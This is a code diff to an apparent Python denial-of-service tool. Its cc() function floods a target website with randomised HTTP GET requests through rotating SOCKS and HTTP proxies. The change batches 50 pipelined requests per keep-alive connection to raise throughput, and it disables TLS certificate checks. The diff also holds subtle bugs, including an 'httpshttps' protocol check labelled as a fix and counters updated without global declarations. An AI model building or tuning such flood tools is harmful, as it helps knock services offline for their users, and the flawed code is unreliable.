@@ -22,6 +22,7 @@ import json
 DEBUG_MODE = True   # 开启调试输出
 DEBUG_SAMPLE_RATE = 1000  # 调试信息每1000次请求打印一次
 # SAMPLE_RATE = 10    # 更频繁的统计采样
+BATCH_SIZE = 50  # 每个连接批量发送50个请求，你可以调整这个值
 
 # FlareSolverr配置（添加到全局统计变量后）
 FLARESOLVERR_URL = "http://localhost:8191/v1"
@@ -600,18 +601,21 @@ def InputOption(question,options,default):
 	return ans
 
 def cc(event, proxy_type):
-    global USE_FLARESOLVERR, url, request_count
+    global request_count # 我们需要直接操作 request_count
     header = GenReqHeader("get")
+    # 确保请求头是 Keep-Alive，如果之前改过，要改回来
+    header = header.replace("Connection: close", "Connection: Keep-Alive") 
+    
     proxy = Choice(proxies).strip().split(":")
     add = "?"
     if "?" in path:
         add = "&"
     event.wait()
-    
+
     while True:
-        # 1. 把 socket 创建和连接的逻辑移到循环内部
-        s = None  # 确保 s 被定义
+        s = None
         try:
+            # 1. 建立一个长连接
             s = socks.socksocket()
             if proxy_type == 4:
                 s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
@@ -620,47 +624,72 @@ def cc(event, proxy_type):
             elif proxy_type == 0:
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             
-            if brute:
-                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            
             s.settimeout(10)
             s.connect((str(target), int(port)))
             
-            if protocol == "https":
+            if protocol == "httpshttps": # 修正: 应该是 "https"
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
 
-            # 2. 发送请求并立即处理响应，然后关闭连接
-            get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-            # 3. 确保使用 Connection: close 来避免混淆
-            request = get_host + header.replace("Connection: Keep-Alive", "Connection: close") 
-            s.send(str.encode(request))
+            # 2. 在这个连接上批量发送请求
+            sent_count_in_batch = 0
+            for _ in range(BATCH_SIZE):
+                try:
+                    get_host = f"GET {path}{add}{randomurl()} HTTP/1.1\r\nHost: {target}\r\n"
+                    request = get_host + header
+                    s.send(str.encode(request))
+                    sent_count_in_batch += 1
+                except socket.error:
+                    # 如果在发送中途连接断开，则停止这个批次
+                    break
             
-            # 使用简化的统计，因为我们现在每次只发一个请求
-            # 这里可以简化，直接接收并解析，因为我们知道连接会关闭
-            response_data = s.recv(4096) # 可以读多一点数据
-            status_code = parse_response(response_data)
-            
-            # 使用你现有的统计函数
-            if status_code:
-                update_stats_simple(status_code=status_code)
-            else:
-                debug_info = response_data[:100].decode('utf-8', errors='ignore') if DEBUG_MODE else None
-                update_stats_simple(is_error=True, error_type="PARSE_FAILED", debug_info=debug_info)
+            # 3. 更新总请求计数
+            with stats_lock:
+                request_count += sent_count_in_batch
 
-            # 4. 手动关闭 socket
-            s.close()
+            # 4. 只进行一次抽样读取，作为整个批次的反馈
+            # 只有当这个批次至少成功发送了一个请求时才读取
+            if sent_count_in_batch > 0:
+                s.settimeout(5) # 设置一个读取超时
+                response_data = s.recv(4096)
+                
+                # 检查是否需要进行详细统计 (基于采样率)
+                # 我们用 request_count 来判断是否命中采样点
+                if request_count % SAMPLE_RATE < BATCH_SIZE:
+                    status_code = parse_response(response_data)
+                    if status_code:
+                        # 记录为一次成功的采样
+                        with stats_lock:
+                            success_count += 1
+                            status_codes[status_code] += 1
+                    else:
+                        # 记录为一次失败的采样
+                        with stats_lock:
+                            error_count += 1
+                            error_key = "ERROR_PARSE_FAILED"
+                            status_codes[error_key] += 1
             
+            # 5. 关闭连接，准备下一个批次
+            s.close()
+
         except Exception as e:
             if s:
                 s.close()
-            # 当连接失败时，更换代理并重试
+            # 连接失败或发生其他错误，更换代理
             proxy = Choice(proxies).strip().split(":")
-            debug_info = str(e) if DEBUG_MODE else None
-            update_stats_simple(is_error=True, error_type="CONNECTION_ERROR", debug_info=debug_info)
-
+            # 这种情况我们也算作错误采样，如果它恰好落在采样点上
+            if request_count % SAMPLE_RATE < BATCH_SIZE:
+                 with stats_lock:
+                    error_count += 1
+                    error_key = "ERROR_CONNECTION"
+                    status_codes[error_key] += 1
+        
+        # 检查是否需要打印报告
+        # 把这个逻辑从统计函数中移到这里，可以避免锁竞争
+        if request_count // REPORT_INTERVAL != (request_count - sent_count_in_batch) // REPORT_INTERVAL:
+            print_stats()
 
 def head(event,proxy_type):
 	global USE_FLARESOLVERR, url, request_count  # ⚠️ 添加这行
